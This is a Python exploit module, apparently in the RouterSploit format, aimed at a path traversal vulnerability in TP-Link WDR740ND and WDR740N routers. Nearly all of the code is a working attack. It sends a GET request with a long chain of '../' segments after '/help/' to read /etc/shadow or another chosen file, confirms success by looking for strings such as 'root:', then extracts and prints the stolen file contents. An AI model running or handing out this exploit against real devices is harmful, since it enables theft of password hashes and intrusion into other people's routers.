# rsf exploit module
# description: TP-Link WDR740ND & WDR740N Path Traversal
import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.filename = "/etc/shadow"

    def http_request(self, method, path):
        url = f"http://{self.target}:{self.port}{path}"
        try:
            response = requests.get(url, timeout=10)
            return response
        except:
            return None

    def detect_file_content(self, text, filename):
        common_strings = {
            "/etc/shadow": ["root:", "bin:", "daemon:"],
            "/etc/passwd": ["root:", "bin:", "daemon:"]
        }
        if filename in common_strings:
            for s in common_strings[filename]:
                if s in text:
                    return True
        return False

    def check(self):
        path = "/help/../../../../../../../../../../../../../../../../etc/shadow"
        response = self.http_request("GET", path)
        if response is None:
            return False
        return self.detect_file_content(response.text, "/etc/shadow")

    def run(self):
        if self.check():
            print("[+] Target is vulnerable")
            path = f"/help/../../../../../../../../../../../../../../../..{self.filename}"
            print("[*] Sending payload request")
            response = self.http_request("GET", path)
            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                pos = response.text.find("//--></SCRIPT>") + 15
                res = response.text[pos:]
                if len(res):
                    print(f"[*] Reading file {self.filename}")
                    print(res)
                else:
                    print(f"[-] Could not read file {self.filename}")
        else:
            print("[-] Exploit failed - target seems to be not vulnerable")
